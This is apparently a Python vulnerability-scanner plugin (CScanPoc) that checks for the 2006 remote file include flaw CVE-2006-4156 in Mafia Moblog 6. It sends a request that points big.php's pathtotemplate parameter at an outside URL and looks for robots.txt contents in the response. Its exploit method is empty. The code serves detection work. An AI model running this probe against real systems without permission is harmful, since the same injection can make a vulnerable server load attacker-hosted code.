# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    poc_id = '442baf8c-8391-4c9b-972f-1ccfb3ab904e'
    name = 'Mafia Moblog 6 Big.PHP Remote File Include Vulnerability' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.RFI # 漏洞类型
    disclosure_date = '2006-08-16'  # 漏洞公布时间
    desc = '''
        Mafia Moblog 6 Big.PHP文件存在远程文件包含漏洞。
    ''' # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-81940' # 
    cnvd_id = 'CNVD-2006-6279' # cnvd漏洞编号
    cve_id = 'CVE-2006-4156'  # cve编号
    product = 'Mafia Moblog'  # 漏洞组件名称
    product_version = '6'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '677ed412-43e5-414c-b938-a1a3914db31a' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/big.php?pathtotemplate=http://baidu.com/robots.txt?'
            response = requests.get(vul_url).content
            if 'Baiduspider' in response or 'Googlebot' in response:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
            
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()